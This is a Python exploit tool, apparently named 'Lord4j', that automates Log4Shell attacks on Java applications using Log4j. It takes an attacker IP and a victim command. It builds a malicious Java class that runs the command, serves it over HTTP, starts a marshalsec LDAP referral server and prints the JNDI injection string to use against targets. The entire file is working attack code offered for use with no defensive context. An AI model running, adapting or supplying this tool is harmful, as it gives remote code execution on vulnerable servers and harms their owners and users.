import subprocess
import threading
import http.server
import socketserver
import argparse
import os
from colorama import Fore, Style

parser = argparse.ArgumentParser()
parser.add_argument("-i", help="IP of attacker", dest='ip', required=True)
parser.add_argument("-c", help="Command to be run on victim", dest='command', required=True)
parser.add_argument("-rip", help="Use only if you plan to use this in remote. Specify remote domain to LDAP Server", dest='rip')
args = parser.parse_args()

ip = args.ip
command = args.command
rip = args.rip

oldd = os.getcwd()

banner = f"""{Fore.RED}

▄▄▌        ▄▄▄  ·▄▄▄▄  ·▄▄▄      ▄▄▄   ▐▄▄▄
██•  ▪     ▀▄ █·██▪ ██ ▐▄▄·▪     ▀▄ █·  ·██
██▪   ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌██▪  ▄█▀▄ ▐▀▀▄ ▪▄ ██
▐█▌▐▌▐█▌.▐▌▐█•█▌██. ██ ██▌.▐█▌.▐▌▐█•█▌▐▌▐█▌
.▀▀▀  ▀█▄▀▪.▀  ▀▀▀▀▀▀• ▀▀▀  ▀█▄▀▪.▀  ▀ ▀▀▀• v 1.0
       		Share with friends and family !			
		Nastly brought to you by lordtmk..
  
{Style.RESET_ALL}
"""

def verify_package(package):
	is_package_installed = subprocess.Popen(
		f"apt -qq list {package}",
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		stdin=None,
		executable='/bin/bash')

	out, err = is_package_installed.communicate()

	return out

def install_package(package):
    
	out = verify_package(package)
	if not 'installed' in out.decode('UTF-8'):
		process = subprocess.Popen(
			f"sudo apt install -y {package}",
			shell=True,
			stdin=None,
			stdout=open("/dev/null", "w"),
			stderr=None,
			executable="/bin/bash")

		print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] Installing {package}..")
		process.wait()
		print(f"[{Fore.GREEN}SUCCESS{Style.RESET_ALL}] {package} installed !")
 
	else:
		print(f"[{Fore.GREEN}SUCCESS{Style.RESET_ALL}] {package} is already installed !")

def deploy_ldap_server(ip):
	if not os.path.exists("marshalsec.zip"):

		print(f'[{Fore.BLUE}INFO{Style.RESET_ALL}] Downloading LDAP_Server..')
		package = subprocess.Popen(
			'wget -O marshalsec.zip https://github.com/mbechler/marshalsec/archive/refs/heads/master.zip',
			shell=True,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			stdin=subprocess.DEVNULL,
			executable="/bin/bash")
		package.wait()
		print(f'[{Fore.BLUE}INFO{Style.RESET_ALL}] Download OK!')
	
		print(f'[{Fore.BLUE}INFO{Style.RESET_ALL}] Unzipping marshalsec..')
		unzip_marshalsec = subprocess.Popen(
			'unzip marshalsec.zip',
			shell=True,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			stdin=subprocess.DEVNULL,
			executable="/bin/bash")
		unzip_marshalsec.wait()
		print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] Package unzipped !")

	if not os.path.exists("marshalsec-master/target"):
		print(f'[{Fore.BLUE}INFO{Style.RESET_ALL}] Building package..')
		build_marshalsec = subprocess.Popen(
			'cd marshalsec-master; mvn clean package -DskipTests',
			shell=True,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			stdin=subprocess.DEVNULL,
			executable="/bin/bash")

		while True:
			output = build_marshalsec.stdout.readline()
			if build_marshalsec.poll() is not None:
				break
			if output:
				print((output.strip().decode("UTF-8")))
		
		print(f"[{Fore.GREEN}SUCCESS{Style.RESET_ALL}] Package built !")
  
	else:
		print(f"[{Fore.GREEN}SUCCESS{Style.RESET_ALL}] LDAP server already installed !")
	
	os.chdir('marshalsec-master/target')
 
	ldap_server = subprocess.Popen(
		f'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{ip}:8000/#Lord4j"',
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		stdin=subprocess.DEVNULL,
		executable="/bin/bash")

	exploit_cmd = "${jndi:ldap://" + ip + ":1389/Lord4j}"
	print(f"[{Fore.RED}EXPLOIT{Style.RESET_ALL}] Your exploitation string will be : {exploit_cmd} [{Fore.RED}EXPLOIT{Style.RESET_ALL}]")

	os.chdir(oldd)

	while True:
		output = ldap_server.stdout.readline()
		if ldap_server.poll() is not None:
			break
		if output:
			print(f"[{Fore.YELLOW}LDAP{Style.RESET_ALL}] {(output.strip().decode('UTF-8'))}")
 
def launch_HTTP_server(ip):
	PORT = 8000

	Handler = http.server.SimpleHTTPRequestHandler

	with socketserver.TCPServer((ip, PORT), Handler) as httpd:
		print(f"[{Fore.MAGENTA}HTTP{Style.RESET_ALL}] Http server listening on : {PORT}")
		httpd.serve_forever()

def forge_exploit(cmd):

	exploit =(
	"public class Lord4j {"

		"static {" 
			"try {"
				f'Runtime.getRuntime().exec("{cmd}").waitFor();'
			"} catch (Exception e) {"
				"e.printStackTrace();"
			"}"
		"}"
	"}"
	)

	with open('Lord4j.java', 'w') as f:
		for line in exploit:
			f.write(line)
			

	jclass = subprocess.Popen('javac Lord4j.java',
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE,
		stdin=None,
		executable='/bin/bash'
	)

	print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] Building exploit..")
	jclass.wait()
	print(f"[{Fore.GREEN}SUCCESS{Style.RESET_ALL}] Exploit built!")
	os.remove("Lord4j.java")
 
print(banner)

install_threads = []
maven_install = threading.Thread(target=install_package, args=('maven',))
install_threads.append(maven_install)
java_install = threading.Thread(target=install_package, args=('openjdk-8-jdk',))
install_threads.append(java_install)
unzip_install = threading.Thread(target=install_package, args=('unzip',))
install_threads.append(unzip_install)

print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] Checking for required packages...")
for t in install_threads:
	t.start()
	
for t in install_threads:
	t.join()

exploit = threading.Thread(target=forge_exploit, args=(command,))
exploit.start()

http_server = threading.Thread(target=launch_HTTP_server, args=(ip,))
http_server.start()

if rip:
    ip = rip
    
ldap_instance = threading.Thread(target=deploy_ldap_server, args=(ip,))
ldap_instance.start()
